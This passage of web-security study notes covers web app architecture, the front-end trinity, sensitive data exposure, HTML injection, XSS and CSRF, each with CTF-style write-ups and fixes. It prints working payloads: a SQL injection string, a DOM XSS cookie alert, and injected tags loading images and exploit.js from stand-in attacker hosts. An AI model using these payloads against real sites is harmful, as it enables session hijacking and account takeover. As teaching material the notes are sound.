   - 4.1 [HTML Structure & the DOM](#41-html-structure--the-dom)
   - 4.2 [URL Encoding](#42-url-encoding)
5. [Cascading Style Sheets (CSS)](#5-cascading-style-sheets-css)
   - 5.1 [CSS Syntax & Usage](#51-css-syntax--usage)
   - 5.2 [CSS Frameworks](#52-css-frameworks)
6. [JavaScript](#6-javascript)
   - 6.1 [What JavaScript Does](#61-what-javascript-does)
   - 6.2 [Usage & Frameworks](#62-usage--frameworks)
7. [Sensitive Data Exposure](#7-sensitive-data-exposure)
   - 7.1 [What Sensitive Data Exposure Is](#71-what-sensitive-data-exposure-is)
   - 7.2 [Finding It in Page Source](#72-finding-it-in-page-source)
   - 7.3 [Prevention](#73-prevention)
8. [HTML Injection](#8-html-injection)
   - 8.1 [What HTML Injection Is](#81-what-html-injection-is)
   - 8.2 [Exploiting HTML Injection](#82-exploiting-html-injection)
9. [Cross-Site Scripting (XSS)](#9-cross-site-scripting-xss)
   - 9.1 [The Three Types of XSS](#91-the-three-types-of-xss)
   - 9.2 [Exploiting XSS (Cookie Theft)](#92-exploiting-xss-cookie-theft)
10. [Cross-Site Request Forgery (CSRF)](#10-cross-site-request-forgery-csrf)
    - 10.1 [What CSRF Is](#101-what-csrf-is)
    - 10.2 [Prevention (Sanitization & Validation)](#102-prevention-sanitization--validation)
11. [Back End Servers](#11-back-end-servers)
    - 11.1 [Software & Stacks](#111-software--stacks)
    - 11.2 [Hardware](#112-hardware)
12. [Web Servers](#12-web-servers)
    - 12.1 [Workflow & HTTP Status Codes](#121-workflow--http-status-codes)
    - 12.2 [Apache, NGINX, IIS](#122-apache-nginx-iis)
13. [Databases](#13-databases)
    - 13.1 [Relational (SQL)](#131-relational-sql)
    - 13.2 [Non-Relational (NoSQL)](#132-non-relational-nosql)
    - 13.3 [Use in Web Applications](#133-use-in-web-applications)
14. [Development Frameworks & APIs](#14-development-frameworks--apis)
    - 14.1 [Development Frameworks](#141-development-frameworks)
    - 14.2 [Query Parameters](#142-query-parameters)
    - 14.3 [Web APIs — SOAP & REST](#143-web-apis--soap--rest)
15. [Common Web Vulnerabilities](#15-common-web-vulnerabilities)
    - 15.1 [Broken Authentication / Access Control](#151-broken-authentication--access-control)
    - 15.2 [Malicious File Upload](#152-malicious-file-upload)
    - 15.3 [Command Injection](#153-command-injection)
    - 15.4 [SQL Injection](#154-sql-injection)
16. [Public Vulnerabilities](#16-public-vulnerabilities)
    - 16.1 [Public CVEs](#161-public-cves)
    - 16.2 [CVSS](#162-cvss)
    - 16.3 [Back-End Server Vulnerabilities](#163-back-end-server-vulnerabilities)
17. [Next Steps](#17-next-steps)

---

# 1. Introduction

---

## 1.1 What a Web Application Is

A web application is an interactive application that runs inside a web browser. Unlike a plain document, it responds to what you do and changes in real time. Web applications almost always use a **client-server architecture**: the **front end** components (the interface — "what the user sees") run on the **client side** in your browser, while the **back end** components (the application''s source code and data) run on the **server side** on a back-end server and its databases. This split lets organizations host powerful applications with near-complete real-time control over design and functionality, while being reachable worldwide. Everyday examples include Gmail (email), Amazon (retail), and Google Docs (word processing).

Crucially, web applications aren''t limited to giant providers. Any developer can build one and host it on common hosting services for anyone on the internet to use — which is why there are millions of web applications online today serving billions of users.

---

## 1.2 Web Applications vs Websites

The key difference is **static vs dynamic**. Traditional websites (called **Web 1.0**) are static: they display fixed information that doesn''t change as you interact with it, and to change the content a developer has to manually edit the page. They have no real functionality and produce no real-time changes. Modern sites run **web applications** (**Web 2.0**) that present *dynamic* content based on user interaction — the page can be different for each user and can actually *do* things. Beyond being dynamic and interactive, web applications are also modular, run on any display size, and run on any platform without needing to be specially optimized.

| Website (Web 1.0) | Web Application (Web 2.0) |
|-------------------|---------------------------|
| Static pages, same for everyone | Dynamic, interactive pages, different per user |
| No real functionality | Fully functional (login, carts, processing) |
| Edited manually by developers | Updates/changes based on user interaction |

---

## 1.3 Web Applications vs Native OS Applications

Compared to **native OS applications** (programs installed on your computer), web applications are **platform-independent** — they run in a browser on any operating system, require no installation, and consume no space on the user''s hard drive because they execute remotely on the server. They also have **version unity**: every user accesses the same single version, which developers can update in one place (the server) without pushing updates to each device or building separately for each platform, dramatically cutting maintenance and support costs.

Native applications still have advantages: they''re faster (they use native OS libraries and local hardware directly), and they''re often more capable because they integrate deeply with the operating system rather than being limited to the browser. More recently, **hybrid** and **progressive web applications (PWAs)** blur the line — they use modern frameworks to tap native OS capabilities, making them faster and more capable than ordinary web apps.

---

## 1.4 Web Application Distribution

Web applications come in two licensing flavors, and knowing which you''re facing shapes your testing. **Open-source** applications have publicly available source code that organizations can customize to their needs — and that *you* can read to find vulnerabilities (whitebox-style). Common examples are **WordPress, OpenCart, and Joomla**. **Proprietary (closed-source)** applications are built by one organization and sold or licensed to others, usually on a subscription model, with no public source code. Common examples are **Wix, Shopify, and DotNetNuke**.

- **Open-source:** WordPress, OpenCart, Joomla — source is public, so known CVEs and code review are available.
- **Closed-source:** Wix, Shopify, DotNetNuke — no public source; you mostly test blackbox.

---

## 1.5 Security Risks & Attacking Web Applications

Web application attacks are extremely common and challenge organizations of every size, because web apps are reachable by anyone with a browser and an internet connection and present a **large attack surface**. Plenty of automated tools exist to scan and attack them, and as applications grow more complex, so does the chance of critical vulnerabilities. A successful attack can cause major losses and business interruption — and since web apps often run on servers holding other sensitive data and are linked to databases of user/corporate data, a single compromise can expose all of it. These days it''s uncommon to find an externally facing host directly exploitable via a known service exploit; instead, the dynamic, constantly-changing nature of web apps means a simple code change can introduce catastrophic flaws, often chainable into data theft or remote code execution.

A standard methodology (based on the **OWASP Web Security Testing Guide**) is to first review the **front-end trinity** (HTML, CSS, JavaScript) for issues like Sensitive Data Exposure and XSS, then review core functionality and the browser↔server interaction, enumerate the technologies in use, and test from both **unauthenticated and authenticated** perspectives.

**Real-world attack examples and their impact:**

| Flaw | Real-world scenario |
|------|---------------------|
| SQL injection | Pull Active Directory usernames, then password-spray a VPN or email portal. |
| File Inclusion | Read source code to find hidden pages/functionality leading to RCE. |
| Unrestricted File Upload | Upload malicious code via a profile-picture feature to take over the server. |
| Insecure Direct Object Reference (IDOR) | Change `/user/701/edit-profile` to `702` to edit another user''s profile. |
| Broken Access Control | Tamper `roleid=3` → `roleid=0/1` during registration to create an admin account. |

The lesson: a single web flaw can be *chained* — extracting data from one app to attack other parts of a company''s infrastructure — which is why a strong web-app foundation sets a pentester apart.

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Initial profiling of the target web application.
>
> - **Type:** dynamic Web 2.0 app with login functionality (test authenticated + unauthenticated).
> - **Distribution:** open-source CMS suspected → check version → search public CVEs.
> - **Methodology:** OWASP WSTG — front-end trinity first (sensitive data, XSS), then functionality and tech stack.
> - **Attack-surface notes:** file upload present (test unrestricted upload), `id`-style URL params present (test IDOR), registration form (test role tampering).
>
> **Screenshot placeholder:** `[ Attach initial recon notes / tech-stack map ]`

---

# 2. Web Application Layout

---

## 2.1 The Three Layout Categories

No two web applications are built the same way — businesses design them for different uses and audiences, with back-end infrastructure set up in many ways. To reason about any app, it helps to break its "layout" into three broad categories. **Infrastructure** describes the required components (like the database) and how they''re arranged, since the app might run on a separate server from its data. **Components** are everything the application interacts with, grouped into UI/UX, client, and server pieces. **Architecture** describes all the relationships between those components. Understanding these three lenses lets you predict where data lives and where an attack might reach.

| Category | What it describes |
|----------|-------------------|
| Web Application **Infrastructure** | The structure of required components (e.g. which database server the app accesses). |
| Web Application **Components** | Everything the app interacts with — divided into UI/UX, Client, and Server. |
| Web Application **Architecture** | All the relationships between the various components. |

---

## 2.2 Infrastructure Models

Infrastructure setups (also called **models**) describe how the servers and databases are arranged, and each has different security implications. There are four common models, ranging from the riskiest single-server setup to a fully segmented, redundant design. The general trend is that **more separation = more security**, because compromising one component doesn''t automatically compromise the others.

- **Client-Server** — the most common overall pattern: a server hosts the app and serves it to any client (desktop, laptop, phone). Front-end components run in the browser; back-end components run on the host. When you click something, the browser sends an HTTP request, the server processes it, and returns a human-readable result.
- **One Server** — the entire app (sometimes several apps) *and* the database all live on a single server. Simple to implement but the **riskiest** — "all eggs in one basket." If any hosted app is vulnerable, the whole server is compromised, and if the server goes down, everything is inaccessible.
- **Many Servers - One Database** — the database is split onto its own server that the app server(s) access. This adds **segmentation**: if one web server is compromised, others aren''t directly affected, and a SQLi against the DB doesn''t directly compromise the app. Multiple apps can share one database without syncing.
- **Many Servers - Many Databases** — builds on the above but each app''s data lives in its own database (or even its own DB server). Widely used for **redundancy** (backups take over if something goes offline). Harder to implement (may need load balancers) but one of the **best choices for security** due to strong segmentation and access control.

Beyond these four, there are also **serverless** apps and apps built on **microservices** (covered below).

---

## 2.3 Web Application Components

While each app has a different number of pieces, all the models above break down into the same set of components. Knowing the full list helps you enumerate what a target is made of and where each attack surface lives. These components span the client side, the server side, and the services and integrations that connect them.

- **Client**
- **Server** — Webserver, Web Application Logic, Database
- **Services (Microservices)**
- **3rd Party Integrations**
- **Web Application Integrations**
- **Functions (Serverless)**

---

## 2.4 Architecture (Three-Tier)

A web application''s components are organized into three layers, known as the **Three-Tier Architecture**. This is one of the most important mental models in web security, because vulnerabilities and defenses map onto these tiers. The **Presentation Layer** is what the client sees and interacts with (returned as HTML, JavaScript, CSS). The **Application Layer** processes client requests and enforces checks like authorization and privileges. The **Data Layer** works with the application layer to determine where data is stored and how it''s accessed.

| Layer | Description |
|-------|-------------|
| **Presentation Layer** | UI process components the client reaches via the browser; returned as HTML/JS/CSS. |
| **Application Layer** | Correctly processes all client requests; checks authorization, privileges, and the data passed to the client. |
| **Data Layer** | Works with the application layer to locate and access the required data. |

Some web servers can also run OS calls and programs (e.g. IIS ISAPI or PHP-CGI), which expands the attack surface.

---

## 2.5 Microservices & Serverless

Two modern architectural styles change how apps are built and attacked. **Microservices** are independent components, each usually programmed for one task (e.g. for an online store: Registration, Search, Payments, Ratings, Reviews). They communicate with the client and each other **statelessly** (request and response are independent, with stored data kept separately), which is a form of service-oriented architecture (SOA). A big advantage is that different microservices can be written in different languages yet still interact. Benefits include agility, flexible scaling, easy deployment, reusable code, and resilience.

**Serverless** architectures (offered by AWS, GCP, Azure, etc.) let developers build and deploy apps without managing servers at all. The code runs in **stateless computing containers** (e.g. Docker), and the cloud provider handles all provisioning, scaling, and maintenance — removing the need to manage infrastructure for the app or database.

---

## 2.6 Architecture Security

Understanding both the general architecture and a specific app''s design is vital during a penetration test, because sometimes a vulnerability isn''t a coding error but a **design error** in the architecture. For example, an app might implement all its core functionality securely, yet a lack of proper access control in the design (e.g. missing **Role-Based Access Control / RBAC**) lets normal users reach admin features or other users'' private data. Fixing that kind of flaw requires a significant, costly, time-consuming design change — not a quick patch.

Architecture also shapes post-exploitation. If, after compromising the back-end server, you can''t find the database, it may be hosted on a separate server (the Many-Servers–One-Database model); if you find only part of the data, there may be several databases in use. This is exactly why security must be considered at **every** phase of development and why pentests should run throughout the development lifecycle.

---

### Documentation Example (CTF-style write-up)

> **Analysis note:** Inferring the target''s infrastructure model.
>
> ```text
> - SQLi on the web app did NOT expose the DB host directly -> DB likely on a separate server
>   (Many-Servers - One/Many-Database model).
> - Only partial data recovered -> possibly multiple databases in use.
> - Admin features reachable by a normal user -> architecture/RBAC design flaw, not just a code bug.
> ```
>
> **Evidence / Notes:** Segmented infrastructure limited the blast radius of the SQLi (DB compromise ≠ app compromise), but a design-level access-control gap allowed vertical privilege escalation. Fix requires an architectural RBAC change, not a one-line patch. **Severity: High.**
>
> **Screenshot placeholder:** `[ Attach inferred architecture diagram ]`

---

# 3. Front End vs Back End

---

## 3.1 The Front End

The **front end** is everything the user interacts with directly through their browser (the **client side**). It''s made of the source code the browser interprets in real time — primarily **HTML, CSS, and JavaScript** (the "front-end trinity"): HTML defines the page''s elements (titles, text), CSS defines design and animation, and JavaScript defines what each part does. In modern apps, front-end components must **adapt to any screen size and work in any browser on any device** — unlike back-end components, which are usually written for a specific platform. Poorly optimized front ends make the whole app feel slow, and users may wrongly blame the server or their internet when the problem is entirely client-side. Front-end work also includes visual web design and UI/UX design.

---

## 3.2 The Back End

The **back end** drives all the core functionality, executing on the back-end server — the part users never see directly, but without which a site is just static pages. There are four main back-end components, and every web app is built on some combination of them. Knowing these four lets you enumerate a target''s stack and map each piece to known vulnerabilities.

| Component | Description |
|-----------|-------------|
| **Back-end Servers** | The hardware + OS hosting everything (Linux, Windows, or containers). |
| **Web Servers** | Handle HTTP requests/connections — Apache, NGINX, IIS. |
| **Databases** | Store/retrieve data — relational (MySQL, MSSQL, Oracle, PostgreSQL) or non-relational (NoSQL, MongoDB). |
| **Development Frameworks** | Build the core app — Laravel (PHP), ASP.NET (C#), Spring (Java), Django (Python), Express (Node.js). |

Each component can be isolated on its own server or in its own **Docker container** (e.g. DB in one container, app in another) to maintain logical separation and limit the impact of a vulnerability in any single part. Back-end work includes building the app''s logic, code, database, libraries, business needs, the APIs the front end calls, and integrations with remote/cloud services.

---

## 3.3 Securing Front/Back End

Even without access to the back-end code, an app isn''t invulnerable — it can still be exploited by **injection attacks**. For example, a search function that mishandles queries could be abused via **SQL injection** (to reach unauthorized database data) or **command injection** (to run OS commands through the app). When you *do* have the front-end source, you can review it for flaws — part of **Whitebox pentesting**. Back-end source normally lives on the server and isn''t accessible, forcing **Blackbox pentesting** — though open-source apps expose their code, and flaws like **Local File Inclusion** can leak back-end source, after which you can code-review it to find passwords and deeper vulnerabilities.

**The top 20 common developer mistakes** (condensed, all worth knowing as a pentester): permitting invalid data into the DB; focusing on the system as a whole; home-grown security methods; treating security as the last step; plaintext password storage; weak passwords; unencrypted data in the DB; over-reliance on the client side; being too optimistic; passing variables via the URL path; trusting third-party code; hard-coded backdoor accounts; unverified SQL injections; remote file inclusions; insecure data handling; failing to encrypt data properly; no secure crypto system; ignoring "layer 8" (users); not reviewing user actions; and WAF misconfigurations.

**These lead to the OWASP Top 10:**

1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

---

### Documentation Example (CTF-style write-up)

> **Methodology note:** Choosing blackbox vs whitebox per component.
>
> ```text
> - Front-end (HTML/CSS/JS): source visible in browser -> whitebox review for secrets & XSS.
> - Back-end: closed source -> blackbox; but app is open-source WordPress -> pull code from repo.
> - LFI found -> read back-end source -> whitebox review of the leaked code for creds/flaws.
> ```
>
> **Evidence / Notes:** Combined approach — whitebox on the always-visible front end, blackbox on the back end, upgraded to whitebox once LFI leaked back-end source. Mapped findings to OWASP Top 10 (Injection, Broken Access Control).
>
> **Screenshot placeholder:** `[ Attach front-end source review + LFI-leaked back-end snippet ]`

---

# 4. HTML

---

## 4.1 HTML Structure & the DOM

**HTML (HyperText Markup Language)** is the first and most dominant front-end component — the core of every web page. It contains each page''s basic elements (titles, forms, images, and more), which the browser interprets and displays. HTML elements are arranged in a **tree**, where the top-level `<html>` tag contains all others under a root called `document`. Each element is opened and closed with a tag (e.g. `<p>` for a paragraph) with content between them, and tags can carry an `id` or `class` used by CSS/JS to target them.

**A basic HTML page:**

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Page Title</title>
    </head>
    <body>
        <h1>A Heading</h1>
        <p>A Paragraph</p>
    </body>
</html>
```

**Its tree structure:**

```
document
 - html
   -- head
      --- title
   -- body
      --- h1
      --- p
```

Each element is a **DOM (Document Object Model)** node. The W3C defines the DOM as "a platform- and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document." The DOM standard has three parts: **Core DOM** (all document types), **XML DOM** (XML documents), and **HTML DOM** (HTML documents). You can refer to nodes like `document.head` or `document.h1`, and locate elements by `id`, tag name, or class name. The `<head>` holds things not printed on the page (like the title), while main content lives in `<body>`; `<style>` holds CSS and `<script>` holds JS. Understanding the DOM is what lets you find where an element lives — and is essential for front-end attacks like XSS that manipulate or create elements.

---

## 4.2 URL Encoding

**URL encoding** (percent-encoding) is a key HTML concept. Browsers can only use **ASCII** in URLs — alphanumerics and certain special characters — so any character outside that set must be encoded. URL encoding replaces an unsafe character with a `%` followed by two hexadecimal digits. This matters constantly in web attacks because you''ll need to encode payload characters (quotes, spaces, angle brackets) so they survive transit in a URL. For example, a single quote `''` becomes `%27`, and a space becomes `+` or `%20`.

**Common character encodings:**

| Character | Encoding |
|-----------|----------|
| space | `%20` |
| `!` | `%21` |
| `"` | `%22` |
| `#` | `%23` |
| `$` | `%24` |
| `%` | `%25` |
| `&` | `%26` |
| `''` | `%27` |
| `(` | `%28` |
| `)` | `%29` |

Many online tools perform URL encoding/decoding, and **Burp Suite''s Decoder** can convert between encodings — invaluable when crafting and debugging payloads.

---

### Documentation Example (CTF-style write-up)

> **Technique note:** URL-encoding a payload to survive transit.
>
> ```text
> Raw payload:     '' OR 1=1 --
> URL-encoded:     %27%20OR%201%3D1%20--
> (single quote -> %27, space -> %20, ''='' -> %3D)
> ```
>
> **Evidence / Notes:** Special characters in the injection payload were percent-encoded so the browser/server interpreted them correctly rather than breaking the request. Verified decode round-trips in Burp Decoder before sending.
>
> **Screenshot placeholder:** `[ Attach Burp Decoder encode/decode of the payload ]`

---

# 5. Cascading Style Sheets (CSS)

---

## 5.1 CSS Syntax & Usage

**CSS (Cascading Style Sheets)** is the stylesheet language used alongside HTML to format and style elements. At a basic level, CSS defines the style for a given element type or class (e.g. `body` or `h1`) — font family, size, background color, text color, alignment, and much more. CSS uses curly-brace blocks following the pattern `element { property : value; }`. Each element has many settable properties (`height`, `position`, `border`, `margin`, `padding`, `color`, `text-align`, `font-size`, and hundreds more), which combine to design visually appealing pages.

**A basic stylesheet:**

```css
body {
  background-color: black;
}
h1 {
  color: white;
  text-align: center;
}
p {
  font-family: helvetica;
  font-size: 10px;
}
```

CSS is often used **alongside JavaScript** to do quick calculations, dynamically adjust element styles, or drive advanced animations (via properties like `@keyframes`, `animation`, `animation-duration`, `animation-direction`). This is why elements are given unique IDs or class names — so CSS *and* JS can target them. CSS can also style other formats (XML, SVG) and even mobile UIs.

---

## 5.2 CSS Frameworks

Writing all styles by hand can be slow and inefficient, so **CSS frameworks** provide ready-made collections of stylesheets and designs to build attractive elements quickly. These frameworks are optimized for web-app use, are designed to work with JavaScript, and include the elements modern apps commonly need. Knowing the common ones helps you fingerprint a site''s front end.

- **Bootstrap**
- **SASS**
- **Foundation**
- **Bulma**
- **Pure**

---

# 6. JavaScript

---

## 6.1 What JavaScript Does

**JavaScript** is one of the most-used languages in the world, central to web (and mobile) development. It usually runs on the **front end**, executing within the browser, though back-end implementations exist (e.g. **Node.js**) for building whole apps. Where HTML and CSS handle how a page *looks*, JavaScript controls the page''s *functionality* — without it, a page would be mostly static and non-interactive. JavaScript is loaded inside a `<script>` tag, either inline or from a remote file.

**Inline JavaScript:**

```html
<script type="text/javascript">
..JavaScript code..
</script>
```

**Remote JavaScript:**

```html
<script src="./script.js"></script>
```

**A basic example** that changes a button''s text content:

```javascript
document.getElementById("button1").innerHTML = "Changed Text!";
```

JavaScript''s syntax is more advanced than HTML or CSS; tools like **JSFiddle** let you experiment with JS, CSS, and HTML together.

---

## 6.2 Usage & Frameworks

Most common web apps rely heavily on JavaScript to drive their functionality: updating the view in real time, dynamically changing content, accepting and processing user input, and more. JavaScript also **automates complex processes** and makes HTTP requests to the back end to send/retrieve data (via technologies like **Ajax**), and drives advanced animations beyond what CSS alone can do. Every modern browser ships a **JavaScript engine** that runs JS client-side without needing the back end to update the page, making it a very fast way to perform many processes.

As apps grow, writing everything in pure JavaScript becomes inefficient, so **JavaScript frameworks** provide libraries that make advanced functionality (login, registration) and technologies (dynamically changing HTML) easy. These frameworks either use JavaScript or compile to it. Common front-end frameworks:

- **Angular**
- **React**
- **Vue**
- **jQuery**

---

### Documentation Example (CTF-style write-up)

> **Recon note:** Front-end tech fingerprinting.
>
> ```text
> - View-source shows <script src="/static/js/main.<hash>.js"> + React markers -> React SPA.
> - Ajax/fetch calls to /api/... -> back-end API endpoints to enumerate next.
> - CSS classes like "col-md-*" -> Bootstrap in use.
> ```
>
> **Evidence / Notes:** Identified a React front end calling a JSON API, and Bootstrap styling. Next step: enumerate the `/api/` endpoints the JS references, since front-end JS often reveals hidden back-end routes and parameters. 
>
> **Screenshot placeholder:** `[ Attach view-source with framework/API markers ]`

---

# 7. Sensitive Data Exposure

---

## 7.1 What Sensitive Data Exposure Is

Front-end components run on the client side, so attacking them doesn''t directly threaten the back end and usually causes no permanent damage — but it **endangers the end-user**, and if leveraged against admins can lead to unauthorized access, data exposure, or service disruption. **Sensitive Data Exposure** specifically refers to sensitive data being available in **clear-text** to the end-user, typically in the **page source** (the HTML source on the front end — not to be confused with back-end code on the server). Because this is so easy to check and so often fruitful, reviewing page source for "low-hanging fruit" like exposed credentials or hidden links is one of the **first things** to do when assessing any web app.

---

## 7.2 Finding It in Page Source

You can view any page''s source by right-clicking and choosing **View Page Source**. If a developer disables right-click, it doesn''t stop you — press **Ctrl+U**, or view source through a proxy like **Burp Suite**. The URL becomes `view-source:https://...`. In the source you might find login credentials, hashes, exposed links or directories, debugging parameters, or hidden functionality — any of which can further your access toward the back end.

**Example — a normal-looking login form hiding credentials in a comment:**

```html
<form action="action_page.php" method="post">
    <div class="container">
        <label for="uname"><b>Username</b></label>
        <input type="text" required>
        <label for="psw"><b>Password</b></label>
        <input type="password" required>

        <!-- TODO: remove test credentials test:test -->

        <button type="submit">Login</button>
    </div>
</form>
```

The leftover developer comment leaks test credentials:

```html
<!-- TODO: remove test credentials test:test -->
```

Since the comment ("remove test credentials") was never removed, the credentials `test:test` may still be valid. While finding literal credentials in comments isn''t *very* common, source review routinely reveals test pages, directories, debug parameters, and hidden functionality — and automated tools can scan source for these too.

---

## 7.3 Prevention

Ideally, front-end source should contain **only** the code needed to run the app''s functions — no extra code or unnecessary comments. Always review what will be visible to end-users through page source, or run it through tools to check for exposed information. It''s also important to **classify data types** in the source and control what can be exposed client-side. Developers should review client-side code to ensure no stray comments or hidden links remain, and may use **JavaScript packing or obfuscation** to reduce the chance of leaking sensitive data through JS (which can also hinder automated scanners).

---

### Documentation Example (CTF-style write-up)

> **Finding:** Valid test credentials exposed in HTML source comment.
>
> **Reproduction:**
> ```text
> 1. Browse to /login.php -> Ctrl+U (or view-source:) 
> 2. Observe: <!-- TODO: remove test credentials test:test -->
> 3. Log in with test:test -> access granted.
> ```
>
> **Evidence / Notes:** A developer comment left in the page source disclosed working credentials (`test:test`). **Severity: High** (direct authenticated access). Fix: strip all non-essential comments from client-visible source; never store credentials in front-end code.
>
> **Screenshot placeholder:** `[ Attach page-source comment + successful login ]`

---

# 8. HTML Injection

---

## 8.1 What HTML Injection Is

A major part of front-end security is **validating and sanitizing user input** — on *both* the front end and back end, because some input is processed and rendered entirely on the front end and never reaches the back end. **HTML injection** occurs when **unfiltered user input is displayed on the page**, either by retrieving stored input (like a comment from the database) or by directly displaying unfiltered input via JavaScript. When a user fully controls how their input is displayed, they can submit **HTML code** that the browser renders as part of the page. This enables attacks like injecting a fake external login form to phish credentials to a malicious server, or **web page defacement** — injecting new HTML to change the page''s appearance, insert malicious ads, or replace the page entirely, causing reputational damage.

---

## 8.2 Exploiting HTML Injection

Consider a basic page with a button "Click to enter your name" that prompts for your name and then displays "Your name is …". Viewing the source shows the input is taken and displayed with **no sanitization**:

```html
<!DOCTYPE html>
<html>
<body>
    <button onclick="inputFunction()">Click to enter your name</button>
    <p id="output"></p>
    <script>
        function inputFunction() {
            var input = prompt("Please enter your name", "");
            if (input != null) {
                document.getElementById("output").innerHTML = "Your name is " + input;
            }
        }
    </script>
</body>
</html>
```

The `innerHTML = "Your name is " + input` line is the flaw — it injects your raw input into the page''s HTML.

**Step 1 — Test with a small HTML snippet** as your "name" to see if it''s rendered as part of the page. This payload changes the page''s background image:

```html
<style> body { background-image: url(''https://academy.hackthebox.com/images/logo.svg''); } </style>
```

Once submitted, the background image changes instantly — confirming HTML injection. (Because everything here happens on the front end, refreshing the page resets it.) An app with no sanitization like this is also a strong candidate for **XSS** (next section).

---

### Documentation Example (CTF-style write-up)

> **Finding:** HTML injection via unsanitized name input.
>
> **Reproduction:**
> ```html
> Input as name:
> <style> body { background-image: url(''https://attacker/x.svg''); } </style>
> -> page background changes, confirming raw HTML is rendered.
> ```
>
> **Evidence / Notes:** User input is written into the page via `innerHTML` with no sanitization, allowing arbitrary HTML injection (defacement, fake login forms/phishing). Front-end-only here, but the same sink is likely XSS-exploitable. **Severity: Medium (High if stored).** Fix: sanitize/encode output; avoid `innerHTML` with user input.
>
> **Screenshot placeholder:** `[ Attach injected background / rendered HTML ]`

---

# 9. Cross-Site Scripting (XSS)

---

## 9.1 The Three Types of XSS

HTML injection flaws can often be escalated to **Cross-Site Scripting (XSS)** by injecting **JavaScript** (not just HTML) to execute on the victim''s client side. Once you can run code in the victim''s browser, you can potentially take over their account or attack their machine. XSS is similar to HTML injection in practice, but it injects JavaScript for more advanced client-side attacks. There are three main types, distinguished by how the malicious input reaches the victim.

| Type | Description |
|------|-------------|
| **Reflected XSS** | User input is displayed on the page after processing (e.g. a search result or error message). |
| **Stored XSS** | User input is stored in the back-end database and displayed on retrieval (e.g. posts or comments). Most dangerous — affects every viewer. |
| **DOM XSS** | User input is shown directly in the browser and written to an HTML DOM object (e.g. a vulnerable username or page title). |

---

## 9.2 Exploiting XSS (Cookie Theft)

Since the HTML-injection example had no input sanitization, the same page may be vulnerable to XSS. A classic proof-of-concept is to pop up the current user''s cookie, which demonstrates you can run arbitrary JavaScript in their session.

**Step 1 — Inject a DOM XSS payload** that reads and displays the cookie:

```javascript
#"><img src=/ onerror=alert(document.cookie)>
```

**How it works:** the `<img src=/ ...>` requests an invalid image, so its `onerror` handler fires, running `alert(document.cookie)`. When the browser processes your input as a new DOM, your JavaScript executes and shows the cookie value in a popup.

**Why it matters:** an attacker won''t just `alert()` — they''ll **steal the cookie** and send it to themselves, then replay it to authenticate as the victim (session hijacking). The same technique enables many other attacks against the app''s users. XSS is a vast topic covered in depth in later modules.

---

### Documentation Example (CTF-style write-up)

> **Finding:** DOM XSS → session cookie disclosure.
>
> **Reproduction:**
> ```text
> Payload: #"><img src=/ onerror=alert(document.cookie)>
> -> alert box displays document.cookie (session value).
> ```
>
> **Evidence / Notes:** Unsanitized input is written to the DOM, executing attacker JavaScript in the victim''s context. A real exploit would exfiltrate the cookie to an attacker server for session hijacking. **Severity: High–Critical** (stored XSS affecting admins would be Critical). Fix: output-encode, use a strong CSP, and set `HttpOnly` on session cookies so JS can''t read them.
>
> **Screenshot placeholder:** `[ Attach alert(document.cookie) popup ]`

---

# 10. Cross-Site Request Forgery (CSRF)

---

## 10.1 What CSRF Is

**Cross-Site Request Forgery (CSRF)** is the third front-end vulnerability caused by unfiltered user input. CSRF attacks often **use XSS** to perform queries and API calls on an app the victim is currently authenticated to — letting the attacker perform actions *as the authenticated user*. (It can also abuse other vectors, like HTTP parameters.) A common CSRF attack crafts a JavaScript payload that **automatically changes the victim''s password** to a value the attacker chose: when the victim views the payload (e.g. a malicious comment containing it), the JS runs automatically and uses the victim''s logged-in session to change the password, after which the attacker logs in and controls the account.

CSRF can also target **admins** to reach sensitive functions (and sometimes the back-end server). Instead of inline JS that returns the session cookie, the attacker can load a remote script:

```html
"><script src=//www.example.com/exploit.js></script>
```

The `exploit.js` file contains the malicious code that changes the user''s password. Writing it requires knowledge of the app''s password-change procedure and APIs, so the attacker replicates that functionality and makes it run automatically.

---

## 10.2 Prevention (Sanitization & Validation)

Although the back end should detect and filter input, it''s also vital to **filter and sanitize user input on the front end** before it reaches the back end — especially for input displayed directly client-side without back-end involvement. Two main controls apply to all user input:

| Control | Description |
|---------|-------------|
| **Sanitization** | Remove special/non-standard characters from input before displaying or storing it. |
| **Validation** | Ensure input matches the expected format (e.g. a submitted email matches the email format). |

It''s also important to **sanitize displayed output** and strip special characters, so even if an attacker bypasses input filters, it causes no harm on the front end. Doing both input and output sanitization/validation should prevent HTML injection and XSS. A **WAF (web application firewall)** can help block injection automatically, but WAFs can be bypassed, so developers must follow secure-coding best practices rather than relying on an appliance.

Additional defenses: modern browsers block automatic JS execution to defend against XSS; most modern apps use **anti-CSRF tokens** (a unique token per session/request); the **`SameSite` cookie attribute** (`Strict` or `Lax`) restricts cookies on cross-origin requests; and functional protections like **requiring the current password before changing it** mitigate CSRF. These should be treated as *additional layers*, not primary safeguards — apps must be secure by design.

---

### Documentation Example (CTF-style write-up)

> **Finding:** Stored XSS enabling CSRF account takeover (password change).
>
> **Reproduction:**
> ```html
> Stored payload (e.g. in a comment):
> "><script src=//attacker/exploit.js></script>
> -> exploit.js uses the victim''s session to POST a password change.
> ```
>
> **Evidence / Notes:** Lack of input/output sanitization allows a stored script that forges a state-changing request as the victim. No anti-CSRF token and no "confirm current password" check compound it. **Severity: Critical** (admin takeover possible). Fix: sanitize/validate in+out, add per-request CSRF tokens, set `SameSite` cookies, and require the current password to change it.
>
> **Screenshot placeholder:** `[ Attach stored payload + forged password-change request ]`

---

# 11. Back End Servers

---

## 11.1 Software & Stacks

A **back-end server** is the hardware and operating system that hosts all the applications needed to run the web application — the real system running every process and task. It sits in the **Data access layer** and contains the other three back-end components: a **Web Server**, a **Database**, and a **Development Framework**. It may also host hypervisors, containers, and WAFs. Back ends are commonly deployed as predefined combinations called **stacks**, and recognizing a stack quickly tells you the likely OS, web server, database, and language in play.

| Stack | Components |
|-------|-----------|
| **LAMP** | Linux, Apache, MySQL, PHP |
| **WAMP** | Windows, Apache, MySQL, PHP |
| **WINS** | Windows, IIS, .NET, SQL Server |
| **MAMP** | macOS, Apache, MySQL, PHP |
| **XAMPP** | Cross-Platform, Apache, MySQL, PHP/PERL |

---

